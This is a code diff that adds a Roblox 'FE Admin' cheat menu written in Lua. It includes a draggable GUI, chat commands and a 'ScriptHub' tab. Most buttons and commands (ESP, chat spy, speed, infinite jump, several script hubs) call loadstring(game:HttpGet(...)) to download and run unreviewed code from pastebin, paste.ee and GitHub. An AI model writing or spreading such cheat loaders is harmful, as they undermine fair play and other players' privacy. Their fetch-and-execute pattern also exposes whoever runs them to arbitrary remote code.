@@ -1,3 +1,422 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Background = Instance.new("ImageLabel")
+local UICorner = Instance.new("UICorner")
+local CommandsBtn = Instance.new("TextButton")
+local ToolsBtn = Instance.new("TextButton")
+local ScriptHubBtn = Instance.new("TextButton")
+local CommandsFrm = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local ToolsFrm = Instance.new("Frame")
+local HopperBin = Instance.new("TextButton")
+local ScriptHubFrm = Instance.new("Frame")
+local SyntaxV2 = Instance.new("TextButton")
+local TextLabel_6 = Instance.new("TextLabel")
+local SushiX = Instance.new("TextButton")
+local SelexityHub = Instance.new("TextButton")
+local TopBar = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local ImageLabel_2 = Instance.new("ImageLabel")
+local CloseBtn = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local UICorner_3 = Instance.new("UICorner")
+local ImageLabel_3 = Instance.new("ImageLabel")
+local UICorner_4 = Instance.new("UICorner")
+local ImageLabel_4 = Instance.new("ImageLabel")
+local ImageLabel_5 = Instance.new("ImageLabel")
+local OpenBtn = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.228059888, 0, 0.279489607, 0)
+Frame.Size = UDim2.new(0, 580, 0, 323)
+Frame.Visible = false
+
+Background.Name = "Background"
+Background.Parent = Frame
+Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Background.BackgroundTransparency = 1.000
+Background.BorderSizePixel = 0
+Background.Size = UDim2.new(0, 580, 0, 323)
+Background.Image = "rbxassetid://3027262817"
+
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Background
+
+CommandsBtn.Name = "CommandsBtn"
+CommandsBtn.Parent = Background
+CommandsBtn.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+CommandsBtn.BorderColor3 = Color3.fromRGB(181, 0, 0)
+CommandsBtn.BorderSizePixel = 2
+CommandsBtn.Position = UDim2.new(0.0206896551, 0, 0.229102165, 0)
+CommandsBtn.Size = UDim2.new(0, 88, 0, 26)
+CommandsBtn.Font = Enum.Font.FredokaOne
+CommandsBtn.Text = "Commands"
+CommandsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CommandsBtn.TextSize = 14.000
+
+ToolsBtn.Name = "ToolsBtn"
+ToolsBtn.Parent = Background
+ToolsBtn.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+ToolsBtn.BorderColor3 = Color3.fromRGB(181, 0, 0)
+ToolsBtn.BorderSizePixel = 2
+ToolsBtn.Position = UDim2.new(0.0206896551, 0, 0.334365308, 0)
+ToolsBtn.Size = UDim2.new(0, 88, 0, 26)
+ToolsBtn.Font = Enum.Font.FredokaOne
+ToolsBtn.Text = "Tools"
+ToolsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToolsBtn.TextSize = 14.000
+
+ScriptHubBtn.Name = "ScriptHubBtn"
+ScriptHubBtn.Parent = Background
+ScriptHubBtn.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+ScriptHubBtn.BorderColor3 = Color3.fromRGB(181, 0, 0)
+ScriptHubBtn.BorderSizePixel = 2
+ScriptHubBtn.Position = UDim2.new(0.0206896551, 0, 0.439999998, 0)
+ScriptHubBtn.Size = UDim2.new(0, 88, 0, 26)
+ScriptHubBtn.Font = Enum.Font.FredokaOne
+ScriptHubBtn.Text = "ScriptHub"
+ScriptHubBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScriptHubBtn.TextSize = 14.000
+
+CommandsFrm.Name = "CommandsFrm"
+CommandsFrm.Parent = Background
+CommandsFrm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CommandsFrm.BackgroundTransparency = 1.000
+CommandsFrm.Position = UDim2.new(0.187931031, 0, 0.176470593, 0)
+CommandsFrm.Size = UDim2.new(0, 459, 0, 259)
+
+TextLabel.Parent = CommandsFrm
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0, 0, 0.065863356, 0)
+TextLabel.Size = UDim2.new(0, 77, 0, 25)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = ";re "
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+
+TextLabel_2.Parent = CommandsFrm
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.167755991, 0, 0.065863356, 0)
+TextLabel_2.Size = UDim2.new(0, 77, 0, 25)
+TextLabel_2.Font = Enum.Font.FredokaOne
+TextLabel_2.Text = ";infjump "
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 14.000
+
+TextLabel_3.Parent = CommandsFrm
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.309368193, 0, 0.065863356, 0)
+TextLabel_3.Size = UDim2.new(0, 77, 0, 25)
+TextLabel_3.Font = Enum.Font.FredokaOne
+TextLabel_3.Text = ";speed(C)"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 14.000
+
+TextLabel_4.Parent = CommandsFrm
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0.477124184, 0, 0.065863356, 0)
+TextLabel_4.Size = UDim2.new(0, 77, 0, 25)
+TextLabel_4.Font = Enum.Font.FredokaOne
+TextLabel_4.Text = ";chatspy"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 14.000
+
+TextLabel_5.Parent = CommandsFrm
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.Position = UDim2.new(0.644880176, 0, 0.065863356, 0)
+TextLabel_5.Size = UDim2.new(0, 77, 0, 25)
+TextLabel_5.Font = Enum.Font.FredokaOne
+TextLabel_5.Text = ";esp"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextSize = 14.000
+
+ToolsFrm.Name = "ToolsFrm"
+ToolsFrm.Parent = Background
+ToolsFrm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ToolsFrm.BackgroundTransparency = 1.000
+ToolsFrm.Position = UDim2.new(0.187931031, 0, 0.176470593, 0)
+ToolsFrm.Size = UDim2.new(0, 459, 0, 259)
+ToolsFrm.Visible = false
+
+HopperBin.Name = "HopperBin"
+HopperBin.Parent = ToolsFrm
+HopperBin.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+HopperBin.BorderColor3 = Color3.fromRGB(181, 0, 0)
+HopperBin.BorderSizePixel = 2
+HopperBin.Position = UDim2.new(0.0424762145, 0, 0.0654825941, 0)
+HopperBin.Size = UDim2.new(0, 415, 0, 26)
+HopperBin.Font = Enum.Font.FredokaOne
+HopperBin.Text = "HopperBin"
+HopperBin.TextColor3 = Color3.fromRGB(255, 255, 255)
+HopperBin.TextSize = 14.000
+HopperBin.MouseButton1Down:connect(function()
+	Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4
+end)
+
+ScriptHubFrm.Name = "ScriptHubFrm"
+ScriptHubFrm.Parent = Background
+ScriptHubFrm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScriptHubFrm.BackgroundTransparency = 1.000
+ScriptHubFrm.Position = UDim2.new(0.187931031, 0, 0.176470593, 0)
+ScriptHubFrm.Size = UDim2.new(0, 459, 0, 259)
+ScriptHubFrm.Visible = false
+
+SyntaxV2.Name = "SyntaxV2"
+SyntaxV2.Parent = ScriptHubFrm
+SyntaxV2.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+SyntaxV2.BorderColor3 = Color3.fromRGB(181, 0, 0)
+SyntaxV2.BorderSizePixel = 2
+SyntaxV2.Position = UDim2.new(0.0424762145, 0, 0.0654825941, 0)
+SyntaxV2.Size = UDim2.new(0, 415, 0, 26)
+SyntaxV2.Font = Enum.Font.FredokaOne
+SyntaxV2.Text = "SyntaxV2"
+SyntaxV2.TextColor3 = Color3.fromRGB(255, 255, 255)
+SyntaxV2.TextSize = 14.000
+SyntaxV2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Memeboiyot/SyntaxRebornOfficial/main/SyntaxReborn'),true))()
+end)
+
+TextLabel_6.Parent = SyntaxV2
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_6.Size = UDim2.new(0, 415, 0, 19)
+TextLabel_6.Font = Enum.Font.FredokaOne
+TextLabel_6.Text = "Key: Syntaxbesthub"
+TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.TextSize = 14.000
+
+SushiX.Name = "Sushi X"
+SushiX.Parent = ScriptHubFrm
+SushiX.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+SushiX.BorderColor3 = Color3.fromRGB(181, 0, 0)
+SushiX.BorderSizePixel = 2
+SushiX.Position = UDim2.new(0.0424762145, 0, 0.266254783, 0)
+SushiX.Size = UDim2.new(0, 415, 0, 26)
+SushiX.Font = Enum.Font.FredokaOne
+SushiX.Text = "Sushi X"
+SushiX.TextColor3 = Color3.fromRGB(255, 255, 255)
+SushiX.TextSize = 14.000
+SushiX.MouseButton1Down:connect(function()
+    local hairAccessoriesWithoutHairInName = {
+['RedBeanieWithHair'] = true;
+['VarietyShades10'] = true;
+}
+ 
+    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+    if v:IsA("Accessory","LongStraightHair") and not hairAccessoriesWithoutHairInName[v.Name] and v.Handle:FindFirstChild("Mesh") then
+    ag = v.Handle:FindFirstChild("Mesh")
+    ag:Destroy()
+    end
+    end
+ 
+     for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+    if v:IsA("Accessory","LongStraightHair") and not hairAccessoriesWithoutHairInName[v.Name] and v.Handle:FindFirstChild("SpecialMesh") then
+    ag = v.Handle:FindFirstChild("SpecialMesh")
+    ag:Destroy()
+    end
+    end
+ 
+ 
+ 
+ 
+loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
+end)
+
+
+SelexityHub.Name = "Selexity Hub"
+SelexityHub.Parent = ScriptHubFrm
+SelexityHub.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+SelexityHub.BorderColor3 = Color3.fromRGB(181, 0, 0)
+SelexityHub.BorderSizePixel = 2
+SelexityHub.Position = UDim2.new(0.0424762145, 0, 0.405250907, 0)
+SelexityHub.Size = UDim2.new(0, 415, 0, 26)
+SelexityHub.Font = Enum.Font.FredokaOne
+SelexityHub.Text = "Selexity Hub"
+SelexityHub.TextColor3 = Color3.fromRGB(255, 255, 255)
+SelexityHub.TextSize = 14.000
+SelexityHub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/o5u3/Selexity/main/Main'),true))()
+end)
+
+
+TopBar.Name = "TopBar"
+TopBar.Parent = Frame
+TopBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TopBar.BackgroundTransparency = 0.400
+TopBar.BorderSizePixel = 0
+TopBar.Position = UDim2.new(0, 0, 0.145692289, 0)
+TopBar.Size = UDim2.new(0, 580, 0, 3)
+
+ImageLabel.Parent = TopBar
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(0.0215439908, 0, -23, 0)
+ImageLabel.Size = UDim2.new(0, 88, 0, 96)
+ImageLabel.Image = "rbxassetid://1030847040"
+
+ImageLabel_2.Parent = TopBar
+ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_2.BackgroundTransparency = 1.000
+ImageLabel_2.Position = UDim2.new(0.17242305, 0, -19.333334, 0)
+ImageLabel_2.Size = UDim2.new(0, 86, 0, 85)
+ImageLabel_2.Image = "rbxassetid://10794265691"
+
+CloseBtn.Name = "CloseBtn"
+CloseBtn.Parent = TopBar
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseBtn.Position = UDim2.new(0.938531518, 0, -12.666666, 0)
+CloseBtn.Size = UDim2.new(0, 24, 0, 23)
+CloseBtn.Font = Enum.Font.FredokaOne
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextSize = 14.000
+
+UICorner_2.CornerRadius = UDim.new(0, 50)
+UICorner_2.Parent = CloseBtn
+
+UICorner_3.CornerRadius = UDim.new(0, 10)
+UICorner_3.Parent = Frame
+
+ImageLabel_3.Parent = ScreenGui
+ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_3.Position = UDim2.new(0, 0, 0.535104394, 0)
+ImageLabel_3.Size = UDim2.new(0, 155, 0, 50)
+ImageLabel_3.Image = "rbxassetid://3027262817"
+
+UICorner_4.CornerRadius = UDim.new(0, 50)
+UICorner_4.Parent = ImageLabel_3
+
+ImageLabel_4.Parent = ImageLabel_3
+ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_4.BackgroundTransparency = 1.000
+ImageLabel_4.Position = UDim2.new(0.171137556, 0, -0.163117066, 0)
+ImageLabel_4.Size = UDim2.new(0, 100, 0, 98)
+ImageLabel_4.Image = "rbxassetid://10794265691"
+
+ImageLabel_5.Parent = ImageLabel_3
+ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_5.BackgroundTransparency = 1.000
+ImageLabel_5.Position = UDim2.new(0.209847242, 0, -0.463117063, 0)
+ImageLabel_5.Size = UDim2.new(0, 89, 0, 82)
+ImageLabel_5.Image = "rbxassetid://1030847040"
+
+OpenBtn.Name = "OpenBtn"
+OpenBtn.Parent = ImageLabel_3
+OpenBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OpenBtn.BackgroundTransparency = 1.000
+OpenBtn.Size = UDim2.new(0, 155, 0, 50)
+OpenBtn.Font = Enum.Font.SourceSans
+OpenBtn.Text = ""
+OpenBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+OpenBtn.TextSize = 14.000
+
+-- Scripts:
+
+local function RHASDL_fake_script() -- CommandsBtn.LocalScript 
+	local script = Instance.new('LocalScript', CommandsBtn)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.CommandsFrm.Visible = true
+		script.Parent.Parent.ToolsFrm.Visible = false
+		script.Parent.Parent.ScriptHubFrm.Visible = false
+	end)
+end
+coroutine.wrap(RHASDL_fake_script)()
+local function GTVFGT_fake_script() -- ToolsBtn.LocalScript 
+	local script = Instance.new('LocalScript', ToolsBtn)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.CommandsFrm.Visible = false
+		script.Parent.Parent.ToolsFrm.Visible = true
+		script.Parent.Parent.ScriptHubFrm.Visible = false
+	end)
+end
+coroutine.wrap(GTVFGT_fake_script)()
+local function JITJNKU_fake_script() -- ScriptHubBtn.LocalScript 
+	local script = Instance.new('LocalScript', ScriptHubBtn)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.CommandsFrm.Visible = false
+		script.Parent.Parent.ToolsFrm.Visible = false
+		script.Parent.Parent.ScriptHubFrm.Visible = true
+	end)
+end
+coroutine.wrap(JITJNKU_fake_script)()
+local function NQPM_fake_script() -- CloseBtn.LocalScript 
+	local script = Instance.new('LocalScript', CloseBtn)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer.PlayerGui.ScreenGui.Frame.Visible = false
+	end)
+end
+coroutine.wrap(NQPM_fake_script)()
+local function NCIHQG_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+end
+coroutine.wrap(NCIHQG_fake_script)()
+local function RMNVFQ_fake_script() -- OpenBtn.LocalScript 
+	local script = Instance.new('LocalScript', OpenBtn)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer.PlayerGui.ScreenGui.Frame.Visible = true
+	end)
+end
+coroutine.wrap(RMNVFQ_fake_script)()
+
+-- FE Admin
+
  game.StarterGui:SetCore("SendNotification", {
     Title = "FE Admin | (ALPHA)"; 
     Text = "Injected"; 
@@ -29,9 +448,23 @@ LPlayer.Chatted:Connect(function(msg)
 			local var = string.sub(msg,space+1)
 			print(var)
 		end
-		if cmd == "reset" then
+		if cmd == "re" then
 			game.Players.LocalPlayer.Character:BreakJoints()
 		end
+        if cmd == "infjump" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/guJ5wajR"))()
+		end
+         if cmd == "speed(C)" then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/angeloX041/Speedc/main/SuperSpeedC "))()
+		end
+        if cmd == "chatSpy" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/MwmrpsPK"))()
+		end
+        if cmd == "esp" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/5Uj8i3Ja"))()
+		end
+        
+	    
 		
 	end
 end)
